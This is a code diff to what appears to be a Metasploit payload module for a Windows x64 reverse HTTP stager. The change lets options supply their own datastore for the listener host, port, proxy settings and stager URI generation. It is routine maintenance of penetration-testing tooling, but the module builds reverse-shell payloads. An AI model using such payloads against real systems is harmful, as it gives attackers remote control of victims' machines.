@@ -46,23 +46,25 @@ module Payload::Windows::ReverseHttp_x64
   # Generate the first stage
   #
   def generate(opts={})
+    ds = opts[:datastore] || datastore
+
     conf = {
       ssl:         opts[:ssl] || false,
-      host:        datastore['LHOST'],
-      port:        datastore['LPORT'],
-      retry_count: datastore['StagerRetryCount']
+      host:        ds['LHOST'],
+      port:        ds['LPORT'],
+      retry_count: ds['StagerRetryCount']
     }
 
     # add extended options if we do have enough space
     if self.available_space && required_space <= self.available_space
-      conf[:url]        = luri + generate_uri
-      conf[:exitfunk]   = datastore['EXITFUNC']
-      conf[:ua]         = datastore['MeterpreterUserAgent']
-      conf[:proxy_host] = datastore['PayloadProxyHost']
-      conf[:proxy_port] = datastore['PayloadProxyPort']
-      conf[:proxy_user] = datastore['PayloadProxyUser']
-      conf[:proxy_pass] = datastore['PayloadProxyPass']
-      conf[:proxy_type] = datastore['PayloadProxyType']
+      conf[:url]        = luri + generate_uri(opts)
+      conf[:exitfunk]   = ds['EXITFUNC']
+      conf[:ua]         = ds['MeterpreterUserAgent']
+      conf[:proxy_host] = ds['PayloadProxyHost']
+      conf[:proxy_port] = ds['PayloadProxyPort']
+      conf[:proxy_user] = ds['PayloadProxyUser']
+      conf[:proxy_pass] = ds['PayloadProxyPass']
+      conf[:proxy_type] = ds['PayloadProxyType']
      else
       # Otherwise default to small URIs
       conf[:url]        = luri + generate_small_uri
@@ -90,14 +92,13 @@ module Payload::Windows::ReverseHttp_x64
   #
   # Generate the URI for the initial stager
   #
-  def generate_uri
-
-    uri_req_len = datastore['StagerURILength'].to_i
+  def generate_uri(opts={})
+    ds = opts[:datastore] || datastore
+    uri_req_len = ds['StagerURILength'].to_i
 
     # Choose a random URI length between 30 and 255 bytes
     if uri_req_len == 0
       uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
-
     end
 
     if uri_req_len < 5
